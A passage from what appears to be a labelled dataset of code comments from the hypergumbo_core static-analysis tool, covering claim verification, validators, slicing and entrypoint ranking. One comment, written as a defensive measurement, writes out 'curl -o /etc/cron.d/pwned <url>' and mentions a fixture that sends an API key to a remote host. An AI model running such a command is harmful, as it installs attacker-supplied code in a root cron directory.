whole language here has no catalogue, I am blind\") versus a\nQUALIFIED OPINION (\"I examined every call and understood them all; three\nhand control to git and no static tool can see inside\"). \"I saw this call, I\nknow ``sendall`` is a catalogued ``net_send`` method, and I could not\ndetermine the receiver's type\" is a qualified opinion by the same test.\n\nBOUNDARY-SCOPED, AND THAT IS WHAT MAKES IT SHIPPABLE. A DOWNGRADE on this\nsignal was measured on 2026-08-11 and recorded DO NOT BUILD IT: on poetry\nevery boundary would have downgraded (db_read 234, ipc_recv 160, fs_read 93,\nfs_write 67, db_write 40, net_send 37, net_recv 35, ipc_send 1), because the\ncatalogued method names include ``close`` / ``get`` / ``read`` / ``write`` /\n``send`` — the most common method names in Python. Two things answer that\nmeasurement rather than ignore it: the verdict is QUALIFIED rather than\nWITHHELD, and a name is matched only against primitives catalogued for the\nCLAIMED boundary, so that measurement's own example — an unrelated dict\n``.get`` — cannot touch a ``net_send`` verdict at all.\n\nTHE OTHER HALF OF THAT REFUTATION IS NOT CITED HERE BECAUSE IT DOES NOT\nSURVIVE. It also called the signal \"anti-correlated with the truth\", arguing\nfrom ``session.post`` — a primitive absent from the catalogue entirely\n(INV-fotav's third-party gap), not one reached through an untyped receiver.\n\nMETHOD-KIND ONLY. A bare ``open()`` has no receiver, so \"I could not type the\nreceiver\" is not a true sentence about it; matching function-kind rows would\nmake the disclosure false on its own evidence.\n\nWHAT IT DOES NOT DO: make the flow VISIBLE. Typing the receiver\ninterprocedurally is the sound recall fix (INV-linub L3) and stays sequenced\nbehind precision by measurement 0001's ``<50%`` band. This makes the VERDICT\nhonest; it does not make the analysis see further."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/verify_claims.py",
    "text": "INV-dabov: a language that CALLED into something and has no I/O\ncatalogue at all. Derived here rather than taken as an argument, for the\nreason the ``catalogs`` docstring already gives: a safety gate a caller\ncan forget to arm fails open, and this one was unarmable — the language\nnever reaches ``supported_languages`` in the first place, because\n``cmd_verify_claims`` builds its catalogs dict under\n``if catalog.primitives:`` and drops an empty catalogue. The same\nomission makes ``_adjudicate_external_modules`` skip it on\n``catalog is None``. So the calls were seen, none could be classified,\nand the verdict was ``confirmed``: reproduced on a 7-line Ruby fixture\nposting ``ENV['API_KEY']`` to a remote host, rc 0, no disclosure.\n\nCALL-SCOPED, NOT REPO-SCOPED, and the distinction is the whole design.\nMeasured over six repos: keyed on languages PRESENT this would name up\nto 16 apiece — markdown, gitignore, yaml, toml — and downgrade every\nverdict for a .gitignore. Keyed on languages that emitted CALL EDGES it\nnames one to three real ones (bash on 6/6; +vue on pretix; +csharp,\nsolidity on hypergumbo, both of which are test fixtures). The honest\ncost is disclosed rather than hidden: `bash` is universal on that\ncohort, so until an io_primitives/bash.yaml exists this downgrades most\nreal repos to `inconclusive` — which is the correct answer for a tool\nthat cannot see what a shell script does.\n\nTHIS COMMENT USED TO END \"and is why the catalogue is the follow-up\nrather than a scope exclusion here.\" That was WRONG, and wrong in the\ndangerous direction, so it is corrected rather than left standing\n(INV-larol). ADR-0016's implementation note rules a bash data-I/O\ncatalogue out — cataloguing `curl` as `net_send` attributes curl's\nnetwork activity to the shell script, and no clean invariant separates\n`curl` from `git`. Measured on the shipped CLI, a two-line script whose\nonly command is `curl -o /etc/cron.d/pwned <url>`, claim \"never writes to\nthe host filesystem\": with no bash.yaml, `inconclusive` rc 2; with six\nlines of `curl -> net_send` bash.yaml, `confirmed` rc 0. The row is\ncorrect and the verdict it buys is a green tick over a write into a root\ncron directory, because classifying a launch used to strip its opacity.\n`_opaque_launch_sites` now consults the producer stamp, so a launch stays\nopaque whatever a catalogue says — the follow-up this comment should have\nnamed, and the one that makes any bash catalogue safe to consider."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/verify_claims.py",
    "text": "ABSTAIN FOR ANY LANGUAGE THAT NEVER POPULATES ``call_construct``. Measured\non two real repos: Go stamps it 7,741 times (6,012 of them ``method``),\nwhile JavaScript and TypeScript stamp it ZERO times across 2,995 call\nedges. For those analyzers the field carries no information, so \"no method\ncall landed in this module\" is absence of evidence, not evidence of\nblindness — and reporting it as blindness would downgrade every JS/TS repo\non earth, which is the blanket-downgrade failure mode this check is built\nto avoid. ``None`` (could not check) is not ``empty`` (checked, found none).\nThat measurement predates WI-nasuf and WI-dosuh: js_ts now stamps\n``method`` on its untyped-receiver placeholders and ``assignment`` on a\nhandler registration, so a JS repo that emits either is checked, not\nabstained on. The abstention is per language and per run."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/verify_claims.py",
    "text": "A clean boundary verdict is CLOSED-WORLD over the receivers the analysis could\ntype, and this says so with a count and a denominator (INV-fibis, unscoped half).\n\nWHY ``CAVEAT_UNTYPED_RECEIVER`` DOES NOT COVER THIS, measured rather than\nargued. That caveat matches the called method's NAME against primitives\ncatalogued for the claimed boundary — and a name lookup is exactly what an\nuntyped receiver makes meaningless. A corpus hunt over 32,593 non-test files\nfound 90 real scopes whose untyped receiver calls a genuine I/O verb outside\nthe 120 catalogued method-kind names (``post`` 56, ``upload_file`` 6,\n``upload`` 6, ``put_item``/``get_item`` 6, ``download_file`` 5,\n``execute_command`` 3). The boundary-scoped caveat fired on ZERO of them. All\n90 were protected by a COVERAGE GAP instead (68 uncatalogued-module, 13\nopaque-launch, 5 unsupported-language) — every one of which the project\nintends to close, so the protection SHRINKS as the tool improves.\n\nDemonstrated end-to-end on unmodified real code: polis\n``deploy-static-assets.py`` uploads to S3 through\n``s3_client.upload_file(...)`` where ``s3_client`` is an unannotated\nparameter. With a realistic project overlay auditing ``boto3`` but omitting\n``upload_file`` from its rows, the shipped CLI returned rc 0 and \"never sends\ndata over the network: confirmed\".\n\nWHY THIS IS NOT THE DOWNGRADE REFUSED ON 2026-08-11. That proposal WITHHELD\nthe verdict (``inconclusive`` on every boundary of every repo). This one\nQUALIFIES it: the verdict still reads clean, the exit code moves 0 -> 3, and\nthe sentence carries a COUNT AND A DENOMINATOR so a reader can size the\nunknown rather than only be told one exists. It is capable of NOT firing —\nan analysis whose receivers are all typed keeps a bare ``confirmed``, which\n``test_all_typed_receivers_stays_bare_confirmed`` pins, because a caveat that\nis always there is discounted by its reader (the lesson\n:func:`_repo_supplied_sanitizer_caveat` already records).\n\nNOT MERGEABLE, and that is why it is absent from :func:`_merge_caveat`'s\nre-render branch: its counts are computed ONCE over the whole analysis in\n:func:`unknown_receiver_scope`, so a second writer with a different slice of\nthe same population cannot exist. The kinds in that branch are the ones a\nsecond writer CAN widen."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/spec_validator.py",
    "text": "----------------------------------------------------------------------\nid-format:F3 — Symbol.id round-trip canary (ADR-0036 Rulings 1-3)\n----------------------------------------------------------------------\n\nThe shape-only ``_CANONICAL_ID_PATTERN`` proves an id has the 5-segment\ngrammar but says nothing about the SEMANTICS of the kind / name / span\nslots. This sub-check closes the round-trip: parse the last three\ncolon-free tokens (span, name, kind) per ADR-0036 Ruling 1 and assert\nthey round-trip to the Symbol's own fields and the symbol-kind registry.\n\nSeverity: ERROR since WI-popak (2026-10-24). The kind-slot membership,\nkind-slot==Symbol.kind and non-empty-name checks landed ADVISORY in the\nWave-2 identity train, because a strict pass red-flagged an id-CHANGING\n(T1) backlog: the ~1645 external_symbol kind-slot disagreements\n(WI-pubiv), the route/event role cohort (WI-kugaj) and the tsconfig\nkind-slot (audit-findings 0005). All three folds landed, and so did the two\nproducer limbs a 2026-10-24 corpus sweep found (cuda / AndroidManifest /\nmessage-dispatch roles in the kind slot, WI-lusoh; empty name slots,\nWI-pusan). The schema-coverage corpus and the surveys swept (grpc,\nwhisper.cpp, sherpa-onnx, envoy-half, torsocks, modsecurity,\nshaka-packager, plasma-desktop, aardvark-dns) read 0. A new violation is a\nproducer defect, so it reports as one."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/spec_validator.py",
    "text": "---- INV-bazij / ADR-0035 §5 umbrella: corpus stable_id collision ----\nPhase 6 PR3 (INV-bazij P0): stable_id was documented as carrying\nper-symbol structural identity but the original hash inputs collided\nat ~60% on the dogfood corpus. v6 (ADR-0035 §1) makes stable_id\nunique WITHIN A RUN by design, so §5 drops this corpus threshold from\n5% to effectively ZERO: any collision is a not-yet-migrated producer\nto surface, never a rate tolerated below an alarm line. Two changes\nfrom the 5%-era check:\n* Threshold 0.0 — fire whenever collided > 0.\n* Denominator INCLUDES the None-stable_id cohort (WI-niluv): the\nrate is over ALL Symbols and the None cohort is disclosed in the\nsame line, so a clean non-null rate can never silently hide a\nlarge no-stable_id cohort (the 2026-06-01 false all-clear shape).\nThis is the SOFT (warning) cross-file signal for the migration\nbacklog; the HARD per-file uniqueness guarantee is a separate error\ncheck (_check_stable_id_per_file_uniqueness). One umbrella violation\nnaming the top-3 groups, not one-per-Symbol. (The fingerprint twin\nbelow keeps the non-null denominator — WI-falum, out of §5 scope.)"
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/spec_validator.py",
    "text": "----------------------------------------------------------------------\nWI-mujor — dangling-endpoint referential-integrity predicate\n----------------------------------------------------------------------\n\nEvery Edge.src / Edge.dst must reference a node id present in the symbol\nset. Post-boundary-synthesis the graph is endpoint-closed by construction:\nevery unresolved dst is materialised as an external_symbol placeholder node\n(the ~27% placeholder-dst cohort; the dst slot carries that placeholder's\nid), and the ADR-0037 edge-finalization train closed the src side — the 23\ntier-filtered src-dangling edges WI-mujor was filed against (substrate\na32c4a31) no longer reproduce: 0 dangling on default / --max-tier 1 /\n--include-docs as re-measured 2026-06-17. This predicate is the standing\nregression guard the Wave-2 gate requires: a producer/filter regression that\ndrops a referenced node (so an edge points at a now-absent id) trips CI\ninstead of silently passing the validator (the WI-moriz false-all-clear\nclass). It is exactly the dst-absent (\"dangling\") half deliberately left out\nof the is_resolved<->dst FK check (see _check_cross_field_coherence's edge\nloop), now its own predicate covering both endpoints.\n\nCONTENT-GATED on a non-empty run set, identically to _check_origin_run_id_fk:\nevery isolated unit fixture calls validate_ir with analysis_runs=[] and\nroutinely points an edge outside its tiny symbol set; gating on \"runs exist\"\nscopes the check to the production/integration path with zero unit-fixture\ncollateral. An empty/None endpoint is NOT flagged here (that is the\ndst_ref<->dst coherence predicate's concern) — only a non-empty-but-unresolved\nreference is \"dangling\", so the two predicates never double-count."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "WI-kutam: only offer ``--language`` when the language axis actually\nSPLITS this candidate set. The template appended it unconditionally,\nso an all-python ambiguity told the user to run ``--language python``\nand get the identical error back. Reported twice from dogfooding, on\ntwo candidate shapes: a real symbol against a\n``python:external:0-0:...:unresolved`` synthetic, and a same-name\ncollision across two packages (``cli:main``).\n\nNOTHING IS SUBSTITUTED FOR IT, and that is deliberate. ``--entry``\naccepts \"symbol name, file path, node ID\" and every candidate's ID is\nprinted above, so the full-ID remedy is the applicable one and it was\nalways there. The tempting additions are not: ``--path`` is the REPO\nROOT rather than a file filter, and there is no ``--file`` flag — so\nsuggesting either would reproduce this exact defect one flag over."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "Container kinds that should be expanded to member methods for reverse slicing.\nWhen reverse-slicing from a class/interface, we also want to find callers of\nits methods, not just edges pointing directly to the class node.\n\nWI-totam: the SAME set the containment linker roots members under\n(``symbol_kinds.container_kind_names``), so every kind that owns members\nexpands to them. A hand-written copy here lacked ``object``\n(Kotlin/Scala), ``contract``, ``record``, ``union``, go ``type`` and\npony's ``actor``, and a slice entering one returned only itself."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/entrypoints.py",
    "text": "Serializer concept -> SERIALIZER (WI-gudob Phase 5):\nFramework-reflected serializer / DTO classes (Django REST\nFramework Serializer / ModelSerializer, Marshmallow Schema and\nSQLAlchemySchema, Grape Entity, Laravel JsonResource /\nResourceCollection, Litestar AbstractDTO / DTOData, ...).\nThe framework instantiates the class from a model / payload\nand reflectively calls a serialize-like method\n(``to_representation``, ``dump``, ``to_internal_value``,\n``toArray``, ``exposure``) — the class body therefore looks\ndead to the static call graph even when wired into a\nreachable route. Classifying the serializer class itself as\nan entrypoint restores its reachability at class level;\nper-method dispatch (``to_representation`` → field methods)\nis deferred to a per-framework dispatch-registry follow-up\nbecause each framework names its reflective methods\ndifferently. 9 framework YAML patterns emit this concept\n(django, flask, flask-restful, grape, laravel, litestar,\nhanami, django-ninja, pyramid per the WI-dajul concept\nregistry audit) and the producers are uniformly class-level\n``base_class`` matches, so the scope is clean."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/entrypoints.py",
    "text": "Remove duplicates (same symbol detected by multiple strategies): keep\nthe MOST CONFIDENT entry per symbol, ties going to the earlier detector.\nINV-liraj: this used to keep the first-EMITTED entry, which made the\nchosen kind an accident of detector order. A Phoenix route marker\n(kind=function, framework_role=route) also matched the Elixir\npublic-function library_export pattern; the concept pass emits that\nLIBRARY_EXPORT (0.75) before the route-marker pass emits HTTP_ROUTE\n(0.90), so every Phoenix route was filed under \"Library API\" and the\nsketch's HTTP Routes section lost them all. Choosing by detection\nconfidence makes the outcome independent of emission order and of the\norder concepts happen to be listed on the symbol."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/entrypoints.py",
    "text": "Penalty for test files (90% reduction).\nMust be aggressive: in repos like DMD where 98% of main()\nfunctions are in test files, a modest penalty (0.5) leaves\ntest entrypoints at 0.40 confidence — high enough to dominate\nauto-slicing selections.  0.1 pushes them to 0.08, well below\nany production entrypoint.\n\nWI-popok / fundamental-concept audit (2026-07-17, KEEP verdict): this\ndeliberately uses the BROAD ``paths.is_test_file`` heuristic (the\nranking notion of \"test-OR-support\" code: also mocks/, fakes/,\nfixtures/, testdata/, benches/, ``_test.<any-ext>``, ``spec_*`` …),\nNOT the narrow supply-chain role flag ``Symbol.is_test_file`` (which\nper spec §14 means \"test *code*\" only — examples/benches/fuzz carry\nother roles). The two are distinct-purpose predicates, not a\ncoarse-vs-granular pair, so this is not a META-bifif re-derivation to\nfold: swapping onto ``sym.is_test_file`` would silently stop\ndeprioritizing mock/fixture/benchmark entrypoints and flood the entry\nlist. Re-evaluation trigger: if ``supply_chain.is_test`` is ever\nbroadened to cover that support-code breadth, re-open the audit and\nreconsider consolidating (guarded by\ntest_support_dir_entrypoint_penalized_via_broad_path_heuristic)."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/entrypoints.py",
    "text": "Per-language demotion: only demote library_export entries when their\nown language has semantic entrypoints.  This prevents the ArkLib\nproblem: 6 Python helper scripts (with main()) should NOT suppress\n163 Lean library_export entries.  Lean exports ARE the right\nentrypoints for a Lean library — Python main() is incidental tooling.\n\nWI-batit: that carve-out protects FIRST-PARTY API surface, so it must not\nextend to VENDORED code.  A tier>=3 export is third-party code the repo\nmerely carries; it is never the API surface a developer slices from, in\nany language.  Without this the carve-out shielded pretix's bundled JS\n(no JS semantic entrypoints -> js not in langs_with_semantic) at\n0.75 * 0.3 = 0.225, above the 0.10 floor, so pdf.worker.js/d3/vue.js\nseeded both `slice --entry auto` and the reverse slice (which ranks with\nthe same detect_entrypoints call) ahead of the real Django views.\nScoped by TIER, not by a vendor-path allowlist, so it is the supply-chain\naxis doing the work rather than a second hand-curated basename set."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/entrypoints.py",
    "text": "Error handler concept -> ERROR_HANDLER (WI-gudob Phase 1):\nHTTP / middleware exception handlers are invoked by the framework\nwhen a route handler raises; the call graph never sees those\ninvocations, so every decorator-registered error handler\n(@app.errorhandler, @app.exception_handler, app.use(errorMid),\nrescue_from, #[catch(…)], etc.) looks dead. 37 framework YAML\npatterns emit this concept (fastapi, express, django, aspnet,\nflask, actix, axum, gin, nestjs, rails, laravel, symfony,\nphoenix, akka-http, ktor, vapor, etc.) — per the WI-dajul\nconcept registry audit it's the #1 inert concept by producer\ncount. Classifying it as a framework-invoked entrypoint makes\nthe bodies reachable from dead-code analysis uniformly across\nevery framework that already emits the concept, without\nneeding per-framework dispatch logic."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/websocket.py",
    "text": "WI-zolot: cross-language client↔server bridge.\n\nHypothesis investigation for hypergumbo's own repo\n(notebookjournal_05162026_0438.md round 4) identified three concrete\ngaps: (1) template-string URL not extracted on the client side; (2)\nStarlette routing-table form not recognised on the server side; (3)\nno cross-language pairing logic at all — only within-language\nsend/receive and file→endpoint references. Patterns (1) and (2) are\nfixed above. This block fixes (3) by emitting a ``calls`` edge with\n``meta[\"protocol\"]=\"ws\"`` from each client endpoint to each server\nendpoint that shares a path string, following the HTTP linker\nconvention. The pairing crosses language boundaries; cross-language-ness\nitself is NOT stamped on the edge — it is derivable from the endpoint\nnode languages (INV-zigup: derive, don't store)."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/websocket.py",
    "text": "ADR-0027 Phase 3 / audit-findings 0013: Symbol.kind=\"websocket_endpoint\"\nis a framework-role leak (Test 4: mechanism vs. category). Fold to the\ncanonical Cluster A construct kind=\"function\" + meta[\"framework_role\"]\nso the kind axis stays language-construct-only.\n\nADR-0028 Phase 3 / audit-findings 0014: the dynamic f-string emits\nf\"{pattern_type}_emit\" and f\"{pattern_type}_endpoint\" leak framework\nidentity into evidence_type. Fold to canonical inference label\nast_call_direct + meta[\"framework_dispatch\"]=<framework_name>. The\npattern_type->framework map now lives at module level\n(_PATTERN_TYPE_TO_FRAMEWORK) with the dependency-gated _resolve_ws_framework.\n\nWI-fizir: collect the repo's declared Python dependencies once so framework\nattribution can be gated on them (the fastapi-vs-starlette disambiguation)."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/paths.py",
    "text": "Ambiguous dirs are utility only at the repo root (depth 0).\nWI-gigib: previously the check was \"ambiguous AND haven't seen\na known source root yet\", which falsely flagged any path whose\ntop-level dir wasn't one of {src, lib, app, crates, packages}\n— e.g. django/utils/html.py, django/contrib/admin/options.py,\nrequests/utils.py, urllib3/contrib/socks.py. Root-only is a\ntighter rule that matches the Kubernetes-style \"contrib/ at\nthe repo root means community add-ons\" convention while keeping\nnested same-named directories as production code."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/paths.py",
    "text": "WI-dibuf: the shapes ``selection.filters.is_test_path`` used to add on\ntop of this classifier, so the two path predicates are one. A Python\nsingle-file test module, TypeScript type tests, Xcode's ``*Tests.swift``\n(``RouteTests.swift``, not ``TestHelpers.swift``), and JVM test naming:\n``*Test`` / ``*Tests`` / ``*IT`` (Maven Failsafe), shapes\nscripts/bakeoff-deep's private regex also knew."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/scip/index.py",
    "text": "INV-lagot: SCIP's META descriptor (the ``:`` suffix) is an encoding\ncategory, not a source-language construct, so ``\"meta\"`` could never be\na registered Symbol.kind under ADR-0027's axiom. It maps to the\nregistry's declared catch-all instead of inventing a value.\n\nNOT folded into ``attribute``, which the registry defines as \"Attribute\ndeclaration (Python class attribute, etc.)\" — a data member, not what\nSCIP means here. RE-EVALUATION TRIGGER: zero META descriptors were\nobserved in rust-analyzer output when this was measured (681\nSymbolInformation entries on aardvark-dns: 500 local, 80 method, 48\nterm, 25 type, 18 namespace, 10 type_parameter, 0 parameter, 0 meta).\nThe first observed META instance should be inspected and given a\nspecific kind if it has one."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/scip/index.py",
    "text": "Defensive: parse_scip_symbol already rejects a header with\nzero descriptors, and the caller filters locals (the other\ndescriptor-less shape) before parsing. Kept as a guard against\na future parser regression. It RAISES rather than returning a\nplaceholder kind: the earlier ``(\"\", \"unknown\")`` was dropped by the\ncaller's empty-name check, but it was still an unregistered\nSymbol.kind in the producer's source, which the producer gates read\nonce they could follow a tuple return (WI-nakur)."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/compact.py",
    "text": "WI-zulij: the DEFAULT path ranks the same population sketch does.\n\nBoth surfaces advertise \"the important symbols\" and both now rank with\ncompute_dampened_centrality — the 2026-07-09 default flip settled the\nranking FUNCTION. What kept their top-10 apart was the population: sketch\nfiltered to key symbols over test-source-free edges, this path filtered\nnothing. Measured on the eight 2026-07-17 bakeoff maps, top-10 agreement\nwas 5.6/10; the symbol filter alone takes it to 7.1, the edge filter alone\nto 8.4, and both together to 10/10 on all eight.\n\nThe edge filter being the DOMINANT clause is the counter-intuitive part\nand the reason both are applied rather than just the obvious one: compact\nwas crediting symbols for being called by their own test suites.\n\nOrder matters — production_edges must see the UNFILTERED symbol list,\nbecause it resolves each edge's src id to a path, and a src that was\nfiltered out would otherwise resolve to \"\" and be kept as non-test.\nsketch builds both from the same unfiltered list for exactly this reason.\n\nNarrowing here rather than at the ranking call site is deliberate: it also\nconstrains which symbols can become force-included SEEDS, and a seed that\nis not a key symbol is precisely the noise leading compact's output today\n(sherpa-csharp's top five emitted nodes were all run*.sh file nodes;\nzoxide led with a shell completion and install.sh). Connectivity mode is\ndeliberately exempt: its contract is bridging disconnected components\n(see the WI-vofud note below on why it keeps the adaptive seed policy),\nand a file node is frequently the only thing joining two islands, so\nnarrowing it would remove the bridges the mode exists to find.\n\nWI-fadab: that exemption is for BRIDGES, and it had also been leaving the\nconnectivity SEEDS unfiltered — the seed list is \"the important symbols\"\nclaim, the bridge picks are not. Measured on the self-analysis map at\n--max-symbols 10: four pyproject [project.scripts] ``file`` entrypoints led\nthe output as seeds, and four ``external_symbol`` placeholders followed as\npicks. So connectivity mode now (a) drops external-boundary nodes from its\npopulation, as the tiered view does — they have no source, and two callers\nof ``time.monotonic`` are not structurally joined by it, so a boundary\n\"bridge\" manufactures connectivity the code does not have — and (b) admits\nonly key symbols as seeds or as the bootstrap (``seed_eligible`` below),\nwhile greedy bridge picks stay unfiltered. The centrality path needs\nneither: ``key_symbols`` already excludes both shapes.\n\nWI-zitag: the bridge exemption covers non-key KINDS (a file node can be\nthe only thing joining two islands), not symbols declared in TEST FILES:\na test that exercises two entrypoints joins them in the call graph, not\nin the production code. So connectivity mode applies the test half of the\nWI-zulij policy too: test-path symbols leave its population and\ntest-sourced edges leave its graph (same order rule as above). Measured\nat K=400 on seven 2026-07-17 maps, test-path nodes went from express\n248/400, SwiftyJSON 203/305, spring-petclinic 145/336, apollo-server\n77/400, caddy 10/400, zoxide 5/231 to 0 on all seven, with the\nproduction node count unchanged (each map's shrink equals its test-path\ncount), containment held, and isolated nodes / components within +-1.\nRefusing test-path nodes only as picks while keeping their edges for\nranking differed from this by at most 4% of picked nodes at any budget."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/compact.py",
    "text": "WI-zulij: NO cap here any more. The old adaptive policy capped\nentrypoints (1/3 or 1/2 of the budget, switching regimes on\nlen(eps) > max_symbols) and then preloaded that whole set before the\nfirst greedy pick — which is precisely what broke containment, since a\nlarger budget seeded MORE nodes and so changed the union-find state the\nscorer reads, producing a different SEQUENCE of picks rather than a\nlonger one. The interleave meters seeds against the budget instead, so\nthe cap is redundant: a small budget simply never reaches the tail of\nthe order. The keycloak concern the cap was written for (500 JAX-RS\nhandlers crowding out the bridging budget) is served better by\nalternating than by a ratio, because bridges are now guaranteed every\nother slot rather than whatever is left over."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/compact.py",
    "text": "WI-zulij: the budget is pure TRUNCATION of one budget-independent\nstream — next seed, best bridge, next seed, best bridge — so step t\ndepends only on the first t-1 emissions and a fixed seed order. The\nemitted list at a smaller budget is therefore a literal ordered PREFIX\nof the list at a larger one, which is containment by construction.\n\nWhy this is the fix and the obvious one is not: the greedy loop never\nread the budget in the first place (`max_additional` appears only in\nits guard), so bridge expansion was ALREADY prefix-nested. What broke\ncontainment was admitting the whole budget-SIZED seed set before the\nfirst pick — a larger budget handed the scorer a different union-find\nstate and produced a different SEQUENCE of picks, not a longer one.\nMeasured on the eight 2026-07-17 maps: 55/120 budget pairs contained\nunder the old policy, 120/120 with a budget-independent seed set.\nPorting WI-vofud's monotone seed QUOTA instead moves 65 violations to\n66 — the seed ORDER was never the problem.\n\n``max_additional`` is the TOTAL emission budget here, not a count of\nadditions beyond free seeds: seeds are part of the stream now, so they\nare metered like anything else.\nSame bootstrap the preload path uses: with no seeds at all there is no\nfrontier to grow from and the stream would emit nothing. The\nhighest-centrality node is budget-independent, so seeding with it costs\ncontainment nothing."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/compact.py",
    "text": "--- Post-selection budget enforcement ---\nCheck if the assembled output fits.  If not, shrink by removing\nnodes that contribute least to the induced subgraph.  This is the\ndefence-in-depth that the old code lacked: edges and entrypoints\nare now accounted for.\n\nRemoval ordering considers LOCAL edge degree to preserve connectivity.\nPrior approach sorted only by (force_include, global_centrality), which\nremoved non-forced nodes with low global centrality first — even if\nthose nodes were the only ones providing edges.  Bakeoff cohort #5\n(iceberg) showed 169 nodes with 0 edges because all frontier-expanded\nproduction nodes (low global centrality) were removed before\ndisconnected force-included test entrypoints."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/type_hierarchy.py",
    "text": "CNF: the passes that produce the extends/implements EDGES this linker\nindexes (WI-rasal; 10 surveys falsified the previous list, all Go repos).\n\nThe old list said where polymorphic dispatch is \"meaningful\" — a language\nproperty. This linker never looks at a language: it builds its inheritance\nmap out of edges, whose language-agnostic producer is\n``inheritance-linker`` (hence the pass id at the head of the clause), plus\nthe analyzers that emit ``extends``/``implements`` themselves. That is why\nGo repos falsified it — ``go`` is not and need not be in this list, since\ninheritance-linker turns Go struct embedding into the edges. ``dart``\nlabels its own edges from the clause a base is written in (WI-lahub):\nDart has no interface kind, so only the clause separates extends from\nimplements, and inheritance-linker's label is keyed on the target's kind.\n\n``elixir`` emits ``implements`` (module -> behaviour, WI-vitas) but this\nlinker builds no dispatch from it: an Elixir function is ``kind\n\"function\"``, never ``\"method\"``, so the analyzer emits the\ncallback -> implementation ``dispatches_to`` itself. Declared because the\nclause names who produces the edges indexed here, not who gains from them.\n\n``kotlin`` emits both labels itself (``_extract_inheritance_edges``,\nfrom a function-local ``edge_type`` ternary). It was missing because the\nproducer-set gate counted only a LITERAL ``edge_type=`` keyword; reading\nit with the registry gate's classifier found it (WI-nakur)."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/type_hierarchy.py",
    "text": "Registry predicate, not the literal ``child_kind == \"interface\"`` this\nreplaced. Audit-findings 0018: that literal named ONE of the three\ninherently-abstract kinds, so Rust `trait` and Swift `protocol` fell\noutside a rule the neighbouring inheritance linker got right — and a\nSwift protocol silently produced no dispatch at all while the equivalent\nJava interface produced one. `abstract class` reaches this too, via the\nmodifier, which the literal could never express."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/all_analyzers.py",
    "text": "WI-didag: FIRST, the productive case. A producer that emitted output\nwithout a run used to fall off the accounting entirely — drained\nbelow and recorded in neither analysis_runs nor skipped_passes,\nbreaking the WI-didil completeness contract precisely when the pass\nSUCCEEDED. Measured with the rust-analyzer backend enabled on\naardvark-dns: 669 nodes and 637 edges from a pass visible nowhere in\nthe catalog, the only one of 118 analyzers for which that was true.\n\nRecording it as a SKIP would be a lie — it plainly ran. So synthesize\nthe AnalysisRun the producer should have supplied and re-enter\nthrough the normal path, which drains the output, stamps the\ncounters and the silence reason, and backfills origin_run_id. This\nis NOT the fabrication WI-didag was filed about: THAT one minted an\nid for a run nobody serializes, while this run IS serialized, so the\nFK resolves. Output proves the pass ran, and an AnalysisRun is the\nhonest record of a pass that ran.\n\nThe warning names it a producer defect rather than absorbing it, so\nthe real fix — attach the run at the source — stays visible."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/all_analyzers.py",
    "text": "A result with no run is an analyzer that produced nothing (WI-didil).\nIt reaches here — rather than being short-circuited by the file-presence\npre-filter (_filter_by_file_presence) — when its declared language is\nabsent from the taxonomy (matlab/meson/puppet/racket/robot/scheme/scss)\nor it is an opt-in backend that stayed off (rust_analyzer). Formerly this\nbranch silently returned, recording NEITHER an AnalysisRun NOR a skip, so\nthose passes violated the \"every catalog pass → AR or skip\" invariant.\nNow it records a skip so coverage of the catalog stays complete. The\nreason honours a self-declared ``skip_reason`` (e.g. rust_analyzer's\n\"backend not enabled\") and otherwise falls back to \"no files matched\" —\nthe same wording the pre-filter uses (a bare ``run=None`` result is a\nno-input analyzer). Symbols/edges are still drained fail-open."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/all_analyzers.py",
    "text": "WI-finij question A: only a pass BODY can know it looked for its\nconstruct and found none, which is why derive_silence_reason refuses\nto infer NO_CANDIDATE_CONSTRUCT -- a reason invented on the producer's\nbehalf is a fabricated disclosure. But this stamp ASSIGNED\nUNCONDITIONALLY, so it overwrote the only producer able to say it, and\nthe declared value had no reachable producer anywhere in the tree.\nGuarded now: a body that spoke keeps its word. The one exception is\n\"\" -- a pass that EMITTED has no silence to explain, and NOT\nAPPLICABLE is not the body's to override."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
